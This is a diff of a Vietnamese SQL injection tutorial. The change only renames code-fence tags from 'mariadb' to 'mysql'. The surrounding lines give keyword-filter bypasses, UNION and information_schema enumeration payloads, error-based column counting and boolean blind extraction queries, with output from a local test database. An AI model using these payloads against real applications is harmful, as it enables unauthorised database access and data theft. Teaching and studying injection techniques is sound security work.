@@ -62,7 +62,7 @@
 
 - Đôi khi người ra đề *filter* đi các từ khóa như *or, and, select, order...* thì ta có thể sử dụng các từ khóa đó theo kiểu *Or, AnD, sEleCt,..* để *bypass* qua nếu *filter* lỏng lẻo
 
-  ```mariadb
+  ```mysql
   MariaDB [xssuser]> sEleCt * fRoM menu WhEre Id = 1;
   +----+-----------+
   | ID | NAME_MENU |
@@ -82,7 +82,7 @@
 
 - Tuy nhiên mặc định của *UNION* thì nó loại bỏ đi các kết quả bị trùng, đôi khi ta cần sử dụng `UNION ALL` để giữ lại các kết quả trùng
 
-  ```mariadb
+  ```mysql
   MariaDB [xssuser]> select * from menu where id = 1;
   +----+-----------+
   | ID | NAME_MENU |
@@ -128,11 +128,11 @@
 
   - Payload:
 
-    ```mariadb
+    ```mysql
     SELECT table_name FROM information_schema.tables
     ```
 
-    ```mariadb
+    ```mysql
     | setup_objects                                      |
     | setup_timers                                       |
     | socket_instances                                   |
@@ -155,11 +155,11 @@
 
   - Payload:
 
-    ```mariadb
+    ```mysql
     SELECT table_name FROM information_schema.tables WHERE table_schema not in ('information_schema', 'mysql', 'performance_schema')
     ```
 
-    ```mariadb
+    ```mysql
     MariaDB [xssuser]> SELECT table_name FROM information_schema.tables WHERE table_schema not in ('information_schema', 'mysql', 'performance_schema');
     +------------+
     | table_name |
@@ -176,11 +176,11 @@
 
   - Payload: 
 
-    ```mariadb
+    ```mysql
     SELECT column_name FROM information_schema.columns WHERE table_schema not in ('information_schema', 'mysql', 'performance_schema')
     ```
 
-    ```mariadb
+    ```mysql
     MariaDB [xssuser]> SELECT column_name FROM information_schema.columns WHERE table_schema not in ('information_schema', 'mysql', 'performance_schema');
     +-------------+
     | column_name |
@@ -202,11 +202,11 @@
 
   - Payload:
 
-    ```mariadb
+    ```mysql
     SELECT schema_name FROM information_schema.schemata WHERE schema_name not in ('information_schema', 'mysql', 'performance_schema')
     ```
 
-    ```mariadb
+    ```mysql
     MariaDB [xssuser]> SELECT schema_name FROM information_schema.schemata WHERE schema_name not in ('information_schema', 'mysql', 'performance_schema');
     +--------------+
     | schema_name  |
@@ -226,11 +226,11 @@
 
   - Payload: 
 
-    ```mariadb
+    ```mysql
     SELECT group_concat(schema_name) FROM information_schema.schemata WHERE schema_name not in ('information_schema', 'mysql', 'performance_schema')
     ```
 
-    ```mariadb
+    ```mysql
     MariaDB [xssuser]> SELECT group_concat(schema_name) FROM information_schema.schemata WHERE schema_name not in ('information_schema', 'mysql', 'performance_schema');
     +---------------------------+
     | group_concat(schema_name) |
@@ -246,11 +246,11 @@
 
   - Payload: 
 
-    ```mariadb
+    ```mysql
     SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = 'xssuser' AND table_name = 'user'
     ```
 
-    ```mariadb
+    ```mysql
     MariaDB [xssuser]> SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = 'xssuser' AND table_name = 'user';
     +----------+
     | COUNT(*) |
@@ -266,11 +266,11 @@
 
   - Payload: 
 
-    ```mariadb
+    ```mysql
     SELECT * FROM user WHERE ID = 1 and(SELECT * from user)=(1)
     ```
 
-    ```mariadb
+    ```mysql
     MariaDB [xssuser]> SELECT * FROM user WHERE ID = 1 and(SELECT * from user)=(1);
     ERROR 1241 (21000): Operand should contain 5 column(s)
     ```
@@ -281,11 +281,11 @@
 
   - Payload: 
 
-    ```mariadb
+    ```mysql
     SELECT `COLUMN_NAME`  FROM `INFORMATION_SCHEMA`.`COLUMNS`  WHERE `TABLE_SCHEMA`='xssuser' AND `TABLE_NAME`='user'
     ```
 
-    ```mariadb
+    ```mysql
     MariaDB [xssuser]> SELECT `COLUMN_NAME`  FROM `INFORMATION_SCHEMA`.`COLUMNS`  WHERE `TABLE_SCHEMA`='xssuser' AND `TABLE_NAME`='user';
     +-------------+
     | COLUMN_NAME |
@@ -305,11 +305,11 @@
 
   - Payload
 
-    ```mariadb
+    ```mysql
     SELECT `2` FROM (select 1,2 UNION SELECT * FROM menu)xssuser
     ```
 
-    ```mariadb
+    ```mysql
     MariaDB [xssuser]> SELECT `2` FROM (select 1,2 UNION SELECT * FROM menu)xssuser;
     +--------+
     | 2      |
@@ -341,7 +341,7 @@
 
 - *Version mysql* của mình là 
 
-  ```mariadb
+  ```mysql
   MariaDB [xssuser]> select version();
   +----------------------------------+
   | version()                        |
@@ -355,18 +355,18 @@
 
   - Payload: 
 
-    ```mariadb
+    ```mysql
     SELECT * FROM user WHERE id = 1 and SUBSTRING(version(),1,1)=1
     ```
 
-    ```mariadb
+    ```mysql
     MariaDB [xssuser]> select * from user where id = 1 and substring(version(),1,1)=2;
     Empty set (0.00 sec)
     ```
 
   - Số đầu tiên của *version mysql* của mình là 1, nên nếu bằng 2 thì sẽ sai nên không in ra kết quả
 
-    ```mariadb
+    ```mysql
     MariaDB [xssuser]> select * from user where id = 1 and substring(version(),1,1)=1;
     +----+---------+---------+---------+-------+
     | ID | USER    | PASS    | USERID  | LEVEL |
@@ -384,7 +384,7 @@
 
   - Payload:
 
-    ```mariadb
+    ```mysql
     SELECT * FROM user WHERE id = 1 AND RIGHT(LEFT(version(),1),1)=1
     ```
 
@@ -392,7 +392,7 @@
 
   - Payload:
 
-    ```mariadb
+    ```mysql
     SELECT * FROM user WHERE id = 1 AND ASCII(LOWER(SUBSTR(Version(),1,1)))=49
     ```
 
@@ -400,7 +400,7 @@
 
   - Payload;
 
-    ```mariadb
+    ```mysql
     SELECT * FROM user WHERE id = 1 AND (SELECT MID(version(),1,1)=1)
     ```
 
@@ -408,11 +408,11 @@
 
   - Payload:
 
-    ```mariadb
+    ```mysql
     (SELECT SUBSTRING(table_name,1,1) = 'm' FROM information_schema.tables WHERE table_schema not in ('information_schema', 'mysql', 'performance_schema') LIMIT 1)
     ```
 
-    ```mariadb
+    ```mysql
     MariaDB [xssuser]> (SELECT SUBSTRING(table_name,1,1) = 'm' FROM information_schema.tables WHERE table_schema not in ('information_schema', 'mysql', 'performance_schema') LIMIT 1);
     +---------------------------------+
     | SUBSTRING(table_name,1,1) = 'm' |
